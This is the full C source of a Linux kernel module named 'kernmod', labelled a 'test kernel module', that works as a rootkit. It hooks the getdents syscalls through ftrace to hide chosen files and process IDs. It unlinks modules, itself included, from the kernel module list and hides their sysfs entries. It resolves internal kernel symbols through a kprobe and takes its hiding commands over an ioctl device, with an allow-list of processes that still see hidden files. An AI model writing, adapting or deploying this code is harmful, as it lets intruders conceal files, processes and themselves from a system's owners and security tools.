#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/miscdevice.h>
#include <linux/version.h>
#include <linux/namei.h>   
#include <linux/dcache.h>

#include "ftrace.h"
#include "common.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ivan Briukhov");
MODULE_DESCRIPTION("test kernel module");

#define MAX_HIDDEN_ENTRIES 64

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 12, 0)
#define FD_FILE(f) fd_file(f)
#else
#define FD_FILE(f) ((f).file)
#endif

struct hidden_file {
    char name[MAX_HIDDEN_NAME];
    struct list_head list;
};

struct hidden_pid {
    pid_t pid;
    struct list_head list;
};

struct hidden_module {
    char name[MAX_MODULE_NAME];
    struct module *mod;
    struct list_head list;
};

struct allowed_pid {
    pid_t pid;
    struct list_head list;
};

static LIST_HEAD(hidden_files);
static LIST_HEAD(hidden_pids);
static LIST_HEAD(hidden_modules);
static LIST_HEAD(allowed_pids);
static int hidden_file_count = 0;
static int hidden_pid_count = 0;
static int hidden_module_count = 0;
static int allowed_pid_count = 0;

static DEFINE_MUTEX(file_list_lock);
static DEFINE_MUTEX(pid_list_lock);
static DEFINE_MUTEX(allowed_pid_lock);

// original syscalls
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);

// module find without find module
static struct module *find_module_safe(const char *name)
{
    struct module *mod;

    if (strcmp(THIS_MODULE->name, name) == 0)
        return THIS_MODULE;

    list_for_each_entry(mod, &THIS_MODULE->list, list) {
        if (mod == THIS_MODULE)
            continue; 
        if (strcmp(mod->name, name) == 0)
            return mod;
    }
    return NULL;
}

// hack to get mod_mutex
static struct mutex *mod_mutex = NULL;

static unsigned long (*kallsyms_lookup_name_fn)(const char *name) = NULL;

static int init_kallsyms(void)
{
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    
    if (register_kprobe(&kp) < 0)
        return -1;
    
    kallsyms_lookup_name_fn = (void *)kp.addr;
    unregister_kprobe(&kp);
    return 0;
}

// flexible path for files
static int resolve_to_absolute(const char *input, char *output, size_t out_size)
{
    struct path path;
    char *buf, *resolved;
    int ret;

    ret = kern_path(input, LOOKUP_FOLLOW, &path);
    if (ret)
        return ret;

    buf = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!buf) {
        path_put(&path);
        return -ENOMEM;
    }

    resolved = d_path(&path, buf, PATH_MAX);
    if (IS_ERR(resolved)) {
        ret = PTR_ERR(resolved);
    } else {
        strscpy(output, resolved, out_size);
        ret = 0;
    }

    kfree(buf);
    path_put(&path);
    return ret;
}

// list control functions
// files:
static int kernmod_add_hidden_file(const char *name)
{
    struct hidden_file *entry;
    char resolved[MAX_HIDDEN_NAME];  
    int err = 0;

    mutex_lock(&file_list_lock);
    err = resolve_to_absolute(name, resolved, sizeof(resolved));
    if (err)                
        strscpy(resolved, name, sizeof(resolved));

    if (hidden_file_count >= MAX_HIDDEN_ENTRIES) {
        err = -ENOMEM;
        goto out;
    }
    
    list_for_each_entry(entry, &hidden_files, list) {
        if (strcmp(entry->name, resolved) == 0) {
            err = -EEXIST;
            goto out;
        }
    }

    entry = kmalloc(sizeof(*entry), GFP_KERNEL);
    if (!entry) {
        err = -ENOMEM;
        goto out;
    }

    strscpy(entry->name, resolved, MAX_HIDDEN_NAME);
    list_add_tail(&entry->list, &hidden_files);
    hidden_file_count++;

    pr_info("kernmod: hiding file '%s'\n", name);

out:
    mutex_unlock(&file_list_lock);
    return err;
}

static int kernmod_remove_hidden_file(const char *name)
{
    struct hidden_file *entry, *tmp;
    char resolved[MAX_HIDDEN_NAME];
    int err = -ENOENT;

    mutex_lock(&file_list_lock);
    if (resolve_to_absolute(name, resolved, sizeof(resolved)) != 0)
        strscpy(resolved, name, sizeof(resolved));

    list_for_each_entry_safe(entry, tmp, &hidden_files, list) {
        if (strcmp(entry->name, resolved) == 0) {
            list_del(&entry->list);
            kfree(entry);
            hidden_file_count--;
            pr_info("kernmod: unhiding file '%s'\n", name);
            err = 0;
            goto out;
        }
    }

out:
    mutex_unlock(&file_list_lock);
    return err;
}

// PIDs:
static int kernmod_add_hidden_pid(pid_t pid)
{
    struct hidden_pid *entry;
    int err = 0;

    mutex_lock(&pid_list_lock);
    if (hidden_pid_count >= MAX_HIDDEN_ENTRIES) {
        err = -ENOMEM;
        goto out;
    }

    list_for_each_entry(entry, &hidden_pids, list) {
        if (entry->pid == pid) {
            err = -EEXIST;
            goto out;
        }
    }

    entry = kmalloc(sizeof(*entry), GFP_KERNEL);
    if (!entry) {
        err = -ENOMEM;
        goto out;
    }

    entry->pid = pid;
    list_add_tail(&entry->list, &hidden_pids);
    hidden_pid_count++;

    pr_info("kernmod: hiding pid %d\n", pid);
    
out:
    mutex_unlock(&pid_list_lock);
    return err;
}

static int kernmod_remove_hidden_pid(pid_t pid)
{
    struct hidden_pid *entry, *tmp;
    int err = -ENOENT;

    mutex_lock(&pid_list_lock);
    list_for_each_entry_safe(entry, tmp, &hidden_pids, list) {
        if (entry->pid == pid) {
            list_del(&entry->list);
            kfree(entry);
            hidden_pid_count--;
            pr_info("kernmod: unhiding pid %d\n", pid);
            err = 0;
            goto out;
        }
    }
    
out:
    mutex_unlock(&pid_list_lock);
    return err;
}

// modules:
static int kernmod_add_hidden_module(const char *name)
{
    struct hidden_module *entry;
    struct module *target;
    char sysfs_path[MAX_HIDDEN_NAME];
    int err = 0;

    mutex_lock(mod_mutex);

    if (hidden_module_count >= MAX_HIDDEN_ENTRIES) {
        err = -ENOMEM;
        goto out;
    }

    list_for_each_entry(entry, &hidden_modules, list) {
        if (strcmp(entry->name, name) == 0) {
            err = -EEXIST;
            goto out;
        }
    }

    target = find_module_safe(name);
    if (!target) {
        pr_warn("kernmod: module '%s' not found\n", name);
        err = -ENOENT;
        goto out;
    }

    entry = kmalloc(sizeof(*entry), GFP_KERNEL);
    if (!entry) {
        err = -ENOMEM;
        goto out;
    }

    strscpy(entry->name, name, MAX_MODULE_NAME);
    entry->mod = target;

    list_del_init(&target->list);

    snprintf(sysfs_path, sizeof(sysfs_path), "/sys/module/%s", name);
    kernmod_add_hidden_file(sysfs_path);

    list_add_tail(&entry->list, &hidden_modules);
    hidden_module_count++;

    pr_info("kernmod: hiding module '%s'\n", name);

out:
    mutex_unlock(mod_mutex);
    return err;
}

static int kernmod_remove_hidden_module(const char *name)
{
    struct hidden_module *entry, *tmp;
    char sysfs_path[MAX_HIDDEN_NAME];
    int err = -ENOENT;

    mutex_lock(mod_mutex);

    list_for_each_entry_safe(entry, tmp, &hidden_modules, list) {
        if (strcmp(entry->name, name) == 0) {
            if (entry->mod == THIS_MODULE) {
                struct list_head *modules_list = 
                    (struct list_head *)kallsyms_lookup_name_fn("modules");
                if (modules_list)
                    list_add(&entry->mod->list, modules_list);
                else
                    goto skip_reinsert;
            } else {
                list_add(&entry->mod->list, &THIS_MODULE->list);
            }

skip_reinsert:
            snprintf(sysfs_path, sizeof(sysfs_path), "/sys/module/%s", name);
            kernmod_remove_hidden_file(sysfs_path);

            list_del(&entry->list);
            kfree(entry);
            hidden_module_count--;

            pr_info("kernmod: unhiding module '%s'\n", name);
            err = 0;
            goto out;
        }
    }

out:
    mutex_unlock(mod_mutex);
    return err;
}

// allowed PIDs
static int kernmod_add_allowed_pid(pid_t pid)
{
    struct allowed_pid *entry;
    int err = 0;

    mutex_lock(&allowed_pid_lock);
    if (allowed_pid_count >= MAX_HIDDEN_ENTRIES) {
        err = -ENOMEM;
        goto out;
    }

    list_for_each_entry(entry, &allowed_pids, list) {
        if (entry->pid == pid) {
            err = -EEXIST;
            goto out;
        }
    }

    entry = kmalloc(sizeof(*entry), GFP_KERNEL);
    if (!entry) {
        err = -ENOMEM;
        goto out;
    }

    entry->pid = pid;
    list_add_tail(&entry->list, &allowed_pids);
    allowed_pid_count++;

    pr_info("kernmod: process %d can now see hidden files\n", pid);

out:
    mutex_unlock(&allowed_pid_lock);
    return err;
}

static int kernmod_remove_allowed_pid(pid_t pid)
{
    struct allowed_pid *entry, *tmp;
    int err = -ENOENT;

    mutex_lock(&allowed_pid_lock);
    list_for_each_entry_safe(entry, tmp, &allowed_pids, list) {
        if (entry->pid == pid) {
            list_del(&entry->list);
            kfree(entry);
            allowed_pid_count--;
            pr_info("kernmod: process %d no longer sees hidden files\n", pid);
            err = 0;
            goto out;
        }
    }

out:
    mutex_unlock(&allowed_pid_lock);
    return err;
}

static bool is_allowed_process(pid_t pid)
{
    struct allowed_pid *entry;

    list_for_each_entry(entry, &allowed_pids, list) {
        if (entry->pid == pid)
            return true;
    }
    return false;
}

// helper functions for hooks
static bool is_proc_dir(unsigned int fd)
{
    struct fd f;
    bool result = false;

    f = fdget(fd);
    if (!FD_FILE(f))
        return false;

    if (FD_FILE(f)->f_path.dentry &&
        FD_FILE(f)->f_path.dentry->d_sb &&
        FD_FILE(f)->f_path.dentry->d_sb->s_type &&
        FD_FILE(f)->f_path.dentry->d_sb->s_type->name &&
        strcmp(FD_FILE(f)->f_path.dentry->d_sb->s_type->name, "proc") == 0)
    {
        if (FD_FILE(f)->f_path.dentry == FD_FILE(f)->f_path.dentry->d_sb->s_root)
            result = true;
    }

    fdput(f);
    return result;
}

static bool should_hide_dirent(const char *name, const char *dir_path, bool is_proc, pid_t caller)
{
    bool result = false;
    
    if (is_proc) {
        long pid_num;
        struct hidden_pid *entry;

        if (kstrtol(name, 10, &pid_num) != 0)
            return false;

        mutex_lock(&pid_list_lock);
        list_for_each_entry(entry, &hidden_pids, list) {
            if (entry->pid == (pid_t)pid_num) {
                result = true;
                break;
            }
        }
        mutex_unlock(&pid_list_lock);
    } else {
        struct hidden_file *entry;
        char full_path[MAX_HIDDEN_NAME];

        mutex_lock(&allowed_pid_lock);
        result = is_allowed_process(caller);
        mutex_unlock(&allowed_pid_lock);

        if (result) 
            return false;

        snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, name);

        mutex_lock(&file_list_lock);
        list_for_each_entry(entry, &hidden_files, list) {
            if (strcmp(entry->name, full_path) == 0) {
                result = true;
                break;
            }
        }
        mutex_unlock(&file_list_lock);
    }
    return result;
}

static int get_dir_path(unsigned int fd, char *buf, int buflen)
{
    struct fd f;
    char *path;
    char *tmp;

    f = fdget(fd);
    if (!FD_FILE(f))
        return -1;

    tmp = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!tmp) {
        fdput(f);
        return -1;
    }

    path = d_path(&FD_FILE(f)->f_path, tmp, PATH_MAX);
    if (IS_ERR(path)) {
        kfree(tmp);
        fdput(f);
        return -1;
    }

    strscpy(buf, path, buflen);
    kfree(tmp);
    fdput(f);
    return 0;
}

// hooks for syscalls
static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *user_dirent;
    struct linux_dirent64 *kern_dirent, *cur, *prev;
    unsigned int fd;
    long ret, new_ret;
    unsigned long offset;
    bool proc;
    char dir_path[MAX_HIDDEN_NAME] = "";
    pid_t caller = current->tgid;

    ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;

    fd = (unsigned int)regs->di;
    user_dirent = (struct linux_dirent64 __user *)regs->si;

    proc = is_proc_dir(fd);

    if (!proc) {
        get_dir_path(fd, dir_path, sizeof(dir_path));
    }
    if (!proc && list_empty(&hidden_files))
        return ret;
    if (proc && list_empty(&hidden_pids))
        return ret;

    kern_dirent = kvmalloc(ret, GFP_KERNEL);
    if (!kern_dirent)
        return ret;

    if (copy_from_user(kern_dirent, user_dirent, ret)) {
        kvfree(kern_dirent);
        return ret;
    }

    new_ret = ret;
    prev = NULL;
    offset = 0;

    while (offset < new_ret) {
        cur = (struct linux_dirent64 *)((char *)kern_dirent + offset);

        if (should_hide_dirent(cur->d_name, dir_path, proc, caller)) {
            pr_info("kernmod: filtering dirent: '%s'\n", cur->d_name);

            if (prev) {
                prev->d_reclen += cur->d_reclen;
            } else {
                new_ret -= cur->d_reclen;
                memmove(cur,
                        (char *)cur + cur->d_reclen,
                        new_ret - offset);
                continue;
            }
        } else {
            prev = cur;
        }

        offset += cur->d_reclen;
    }

    if (copy_to_user(user_dirent, kern_dirent, new_ret)) {
        kvfree(kern_dirent);
        return ret;
    }

    kvfree(kern_dirent);
    return new_ret;
}

struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

static asmlinkage long hook_getdents(const struct pt_regs *regs)
{
    struct linux_dirent __user *user_dirent;
    struct linux_dirent *kern_dirent, *cur, *prev;
    unsigned int fd;
    long ret, new_ret;
    unsigned long offset;
    bool proc;
    char dir_path[MAX_HIDDEN_NAME] = "";
    pid_t caller = current->tgid;

    ret = orig_getdents(regs);
    if (ret <= 0)
        return ret;

    fd = (unsigned int)regs->di;
    user_dirent = (struct linux_dirent __user *)regs->si;

    proc = is_proc_dir(fd);

    if (!proc) {
        get_dir_path(fd, dir_path, sizeof(dir_path));
    }
    if (!proc && list_empty(&hidden_files))
        return ret;
    if (proc && list_empty(&hidden_pids))
        return ret;

    kern_dirent = kvmalloc(ret, GFP_KERNEL);
    if (!kern_dirent)
        return ret;

    if (copy_from_user(kern_dirent, user_dirent, ret)) {
        kvfree(kern_dirent);
        return ret;
    }

    new_ret = ret;
    prev = NULL;
    offset = 0;

    while (offset < new_ret) {
        cur = (struct linux_dirent *)((char *)kern_dirent + offset);

        if (should_hide_dirent(cur->d_name, dir_path, proc, caller)) {
            if (prev) {
                prev->d_reclen += cur->d_reclen;
            } else {
                new_ret -= cur->d_reclen;
                memmove(cur,
                        (char *)cur + cur->d_reclen,
                        new_ret - offset);
                continue;
            }
        } else {
            prev = cur;
        }

        offset += cur->d_reclen;
    }

    if (copy_to_user(user_dirent, kern_dirent, new_ret)) {
        kvfree(kern_dirent);
        return ret;
    }

    kvfree(kern_dirent);
    return new_ret;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents",   hook_getdents,   &orig_getdents),
};

// ioctl handler
static long kernmod_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    char buf[MAX_HIDDEN_NAME] = {0};
    long pid_num;

    switch (cmd) {
    case IOCTL_HIDE_FILE:
        if (copy_from_user(buf, (char __user *)arg, MAX_HIDDEN_NAME))
            return -EFAULT;
        buf[MAX_HIDDEN_NAME - 1] = '\0';
        return kernmod_add_hidden_file(buf); 

    case IOCTL_UNHIDE_FILE:
        if (copy_from_user(buf, (char __user *)arg, MAX_HIDDEN_NAME))
            return -EFAULT;
        buf[MAX_HIDDEN_NAME - 1] = '\0';
        return kernmod_remove_hidden_file(buf);
    
    case IOCTL_HIDE_PID:
        if (copy_from_user(buf, (char __user *)arg, MAX_PID_STR))
            return -EFAULT;
        buf[MAX_PID_STR - 1] = '\0';
        if (kstrtol(buf, 10, &pid_num) != 0)
            return -EINVAL;
        return kernmod_add_hidden_pid((pid_t)pid_num);

    case IOCTL_UNHIDE_PID:
        if (copy_from_user(buf, (char __user *)arg, MAX_PID_STR))
            return -EFAULT;
        buf[MAX_PID_STR - 1] = '\0';
        if (kstrtol(buf, 10, &pid_num) != 0)
            return -EINVAL;
        return kernmod_remove_hidden_pid((pid_t)pid_num);
    
    case IOCTL_HIDE_MODULE:
        if (copy_from_user(buf, (char __user *)arg, MAX_MODULE_NAME))
            return -EFAULT;
        buf[MAX_MODULE_NAME - 1] = '\0';
        return kernmod_add_hidden_module(buf);

    case IOCTL_UNHIDE_MODULE:
        if (copy_from_user(buf, (char __user *)arg, MAX_MODULE_NAME))
            return -EFAULT;
        buf[MAX_MODULE_NAME - 1] = '\0';
        return kernmod_remove_hidden_module(buf);
        
    case IOCTL_ALLOW_PID:
        if (copy_from_user(buf, (char __user *)arg, MAX_PID_STR))
            return -EFAULT;
        buf[MAX_PID_STR - 1] = '\0';
        if (kstrtol(buf, 10, &pid_num) != 0)
            return -EINVAL;
        return kernmod_add_allowed_pid((pid_t)pid_num);

    case IOCTL_DISALLOW_PID:
        if (copy_from_user(buf, (char __user *)arg, MAX_PID_STR))
            return -EFAULT;
        buf[MAX_PID_STR - 1] = '\0';
        if (kstrtol(buf, 10, &pid_num) != 0)
            return -EINVAL;
        return kernmod_remove_allowed_pid((pid_t)pid_num);

    case IOCTL_GET_STATUS: {
        struct kernmod_status_request req;
        char *kbuf;
        int len;
    
        if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
            return -EFAULT;
    
        if (req.buf_size == 0 || req.buf_size > 8192)
            return -EINVAL;
    
        kbuf = kvmalloc(req.buf_size, GFP_KERNEL);
        if (!kbuf)
            return -ENOMEM;
    
        len = 0;
    
        len += snprintf(kbuf + len, req.buf_size - len,
            "\n=== kernmod module status ===\n\n");
        if (len >= req.buf_size)
            len = req.buf_size;

        mutex_lock(&file_list_lock);
        struct hidden_file *f;
        len += snprintf(kbuf + len, req.buf_size - len,
                        "\nHidden files (%d):\n", hidden_file_count);
        if (len >= req.buf_size)
            len = req.buf_size;
        list_for_each_entry(f, &hidden_files, list) {
            len += snprintf(kbuf + len, req.buf_size - len,
                            "  - %s\n", f->name);
            if (len >= req.buf_size)
                len = req.buf_size;
        }
        mutex_unlock(&file_list_lock);

        mutex_lock(&pid_list_lock);
        struct hidden_pid *p;
        len += snprintf(kbuf + len, req.buf_size - len,
                        "\nHidden PIDs (%d):\n", hidden_pid_count);
        if (len >= req.buf_size)
            len = req.buf_size;
        list_for_each_entry(p, &hidden_pids, list) {
            len += snprintf(kbuf + len, req.buf_size - len,
                            "  - %d\n", p->pid);
            if (len >= req.buf_size)
                len = req.buf_size;
        }
        mutex_unlock(&pid_list_lock);

        mutex_lock(mod_mutex);
        struct hidden_module *m;
        len += snprintf(kbuf + len, req.buf_size - len,
                        "\nHidden modules (%d):\n", hidden_module_count);
        if (len >= req.buf_size)
            len = req.buf_size;
        list_for_each_entry(m, &hidden_modules, list) {
            len += snprintf(kbuf + len, req.buf_size - len,
                            "  - %s\n", m->name);
            if (len >= req.buf_size)
                len = req.buf_size;
        }
        mutex_unlock(mod_mutex);

        mutex_lock(&allowed_pid_lock);
        struct allowed_pid *a;
        len += snprintf(kbuf + len, req.buf_size - len,
                    "\nAllowed PIDs (%d):\n", allowed_pid_count);
        if (len >= req.buf_size)
            len = req.buf_size;
        list_for_each_entry(a, &allowed_pids, list) {
        len += snprintf(kbuf + len, req.buf_size - len,
                        "  - %d\n", a->pid);
        if (len >= req.buf_size)
            len = req.buf_size;
        }
        mutex_unlock(&allowed_pid_lock);
    
        if (copy_to_user(req.buf, kbuf, len)) {
            kvfree(kbuf);
            return -EFAULT;
        }
    
        req.out_len = len;
        if (copy_to_user((void __user *)arg, &req, sizeof(req))) {
            kvfree(kbuf);
            return -EFAULT;
        }
    
        kvfree(kbuf);
        return 0;
    }

    default:
        return -EINVAL;
    }
}

static const struct file_operations kernmod_fops = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = kernmod_ioctl,
};

static struct miscdevice kernmod_dev = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = "kernmod",
    .fops = &kernmod_fops,
    .mode = 0660,
};

// init / exit
static int __init kernmod_init(void)
{
    int err = -ENOENT;

    if (init_kallsyms() < 0 || !kallsyms_lookup_name_fn) {
        pr_err("kernmod: failed to get kallsyms_lookup_name\n");
        return err;
    }

    mod_mutex = (struct mutex *)kallsyms_lookup_name_fn("module_mutex");
    if (!mod_mutex) {
        pr_err("kernmod: failed to get module_mutex\n");
        return err;
    }

    pr_info("kernmod: got module_mutex at %px\n", mod_mutex);

    err = misc_register(&kernmod_dev);
    if (err) {
        pr_err("kernmod: misc_register failed: %d\n", err);
        return err;
    }

    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        pr_err("kernmod: fh_install_hooks failed: %d\n", err);
        misc_deregister(&kernmod_dev);
        return err;
    }

    pr_info("kernmod: module loaded (kernel %d.%d)\n",
            LINUX_VERSION_MAJOR, LINUX_VERSION_PATCHLEVEL);
    return 0;
}

static void __exit kernmod_exit(void)
{
    struct hidden_file *fentry, *ftmp;
    struct hidden_pid *pentry, *ptmp;
    struct hidden_module *mentry, *mtmp;
    struct allowed_pid *aentry, *atmp;

    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

    mutex_lock(mod_mutex);
    list_for_each_entry_safe(mentry, mtmp, &hidden_modules, list) {
        list_add(&mentry->mod->list, &THIS_MODULE->list);
        list_del(&mentry->list);
        kfree(mentry);
    }
    mutex_unlock(mod_mutex);

    mutex_lock(&file_list_lock);
    list_for_each_entry_safe(fentry, ftmp, &hidden_files, list) {
        list_del(&fentry->list);
        kfree(fentry);
    }
    mutex_unlock(&file_list_lock);

    mutex_lock(&pid_list_lock);
    list_for_each_entry_safe(pentry, ptmp, &hidden_pids, list) {
        list_del(&pentry->list);
        kfree(pentry);
    }
    mutex_unlock(&pid_list_lock);

    mutex_lock(&allowed_pid_lock);
    list_for_each_entry_safe(aentry, atmp, &allowed_pids, list) {
        list_del(&aentry->list);
        kfree(aentry);
    }
    mutex_unlock(&allowed_pid_lock);

    misc_deregister(&kernmod_dev);
    pr_info("kernmod: module unloaded\n");
}

module_init(kernmod_init);
module_exit(kernmod_exit);